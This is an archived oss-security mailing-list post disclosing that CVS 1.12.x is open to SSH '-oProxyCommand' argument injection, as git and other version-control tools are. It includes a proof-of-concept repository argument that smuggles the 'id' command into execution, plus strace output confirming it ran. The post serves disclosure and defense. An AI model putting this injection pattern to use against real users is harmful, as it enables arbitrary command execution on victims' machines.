X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2904" "Thursday" "10" "August" "2017" "17:32:24" "-0600" "Hank Leininger" "hlein@korelogic.com" "<20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>" "71" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" nil nil nil "8" "2017081023:32:24" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" (number mark "U       hlein@korelo Aug 10   71/2904  " thread-indent "\"[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3080 invoked by uid 550); 11 Aug 2017 02:32:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29948 invoked from network); 10 Aug 2017 23:31:50 -0000
Date: Thu, 10 Aug 2017 17:32:24 -0600
From: Hank Leininger <hlein@korelogic.com>
To: oss-security@lists.openwall.com
Message-ID: <20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="/Fj8Y87PmZ4bKoDi"
Content-Disposition: inline
Subject: [oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)

--/Fj8Y87PmZ4bKoDi
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

SSH command injection via -o... impacts CVS 1.12.x as well, if anybody
still cares.

The announcement for git mentions CVE-2017-1000117, CVE-2017-9800, and
CVE-2017-1000116 for git, Subversion, Mercurial, but makes no mention
of CVS.  None of those CVEs are currently viewable at
https://cve.mitre.org/cgi-bin/cvename.cgi?name=3D , and I don't know if
these were discussed on a private list prior to publication, and
whether that discussion included CVS.

CVS can be configured to use SSH for remote repos, such as with
CVS_RSH=3Dssh.  In which case specifying a hostname of -o... triggers the
same sort of thing:

  $ strace -f -e execve cvs -d '-oProxyCommand=3Did;localhost:/bar' co yada=
 2>&1 | egrep id
  execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=3Did;localhost:/bar"=
, "co", "yada"], 0x7ffe69f75a68 /* 139 vars */) =3D 0
  [snip]
  [pid 20003] execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=3Did;loc=
alhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D -1 ENOENT (No such=
 file or directory)
  [pid 20003] execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=3Did;localhost=
", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D 0
  [pid 20004] execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"],=
 0x32af5f10d0 /* 141 vars */) =3D 0
  [pid 20004] execve("/usr/bin/id", ["id"], 0xec92226ae0 /* 141 vars */) =
=3D 0
  [pid 20004] +++ exited with 0 +++
  [pid 20003] --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=
=3D20004, si_uid=3D3612, si_status=3D0, si_utime=3D0, si_stime=3D0} ---
  ssh_exchange_identification: Connection closed by remote host
  [pid 20003] +++ exited with 255 +++
  --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=3D20003, si=
_uid=3D3612, si_status=3D255, si_utime=3D0, si_stime=3D0} ---

Tested vanilla 1.12.13, and Gentoo 1.12.12-r11.

Of course, the repo specification looks very odd, so tricking a victim
may be harder than for SCM tools where it's prefixed by an ssh:// or
masked behind a redirect.  Plus, first you would have find a victim.

Thanks,

--=20

Hank Leininger <hlein@korelogic.com>
5F6D DCC8 FF53 8093 EC39  127B 091E 7F7C E898 E86C

--/Fj8Y87PmZ4bKoDi
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCAAdFiEEX23cyP9TgJPsORJ7CR5/fOiY6GwFAlmM7QgACgkQCR5/fOiY
6Gz0kQgA5ORzNGGtpAar4atw5XB6/c20EMvJQ/7lbKGNJzqNYJQUKTOgtOes4tYN
diyCITLlAXLLWIuEiKhE937sbh5mF78rynPktY/dxJ6zqEaQf/fF5CJ6ycDG0xvw
+ZjCJ0QSVTB6hbZ/c3KwqqKLydw+kZVW+1S68loMOmmX0MuKgecCcTVIrGX917DH
LfR4EZKfbof3skWyMvMoaBY3wasQDZabQxAbYtJkADvORTtVj0vqFKLPCtQczPg4
za0ULDNoLZtc51SSK6hHa1HjcrDtvvu/UGagtnUB2GfG6v0qfU0r+XBw2Vuc6git
UXvbF78RDA97pw3gpfo777WuuFZJ9g==
=zjvc
-----END PGP SIGNATURE-----

--/Fj8Y87PmZ4bKoDi--
